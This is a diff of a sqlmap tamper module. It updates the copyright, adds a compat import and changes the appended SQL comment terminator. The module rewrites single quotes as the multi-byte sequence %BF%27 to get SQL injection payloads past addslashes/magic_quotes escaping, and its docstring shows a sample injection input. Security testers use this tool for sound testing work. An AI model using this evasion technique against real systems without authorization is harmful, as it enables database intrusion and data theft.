@@ -1,12 +1,13 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
 import re
 
+from lib.core.compat import xrange
 from lib.core.enums import PRIORITY
 
 __priority__ = PRIORITY.NORMAL
@@ -16,8 +17,7 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     """
-    Replaces quote character (') with a multi-byte combo %bf%27 together with
-    generic comment at the end (to make it work)
+    Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
 
     Notes:
         * Useful for bypassing magic_quotes/addslashes feature
@@ -26,7 +26,7 @@ def tamper(payload, **kwargs):
         * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
 
     >>> tamper("1' AND 1=1")
-    '1%bf%27-- '
+    '1%bf%27-- -'
     """
 
     retVal = payload
@@ -47,7 +47,7 @@ def tamper(payload, **kwargs):
             _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
             if _ != retVal:
                 retVal = _
-                retVal += "-- "
+                retVal += "-- -"
             elif not any(_ in retVal for _ in ('#', '--', '/*')):
-                retVal += "-- "
+                retVal += "-- -"
     return retVal
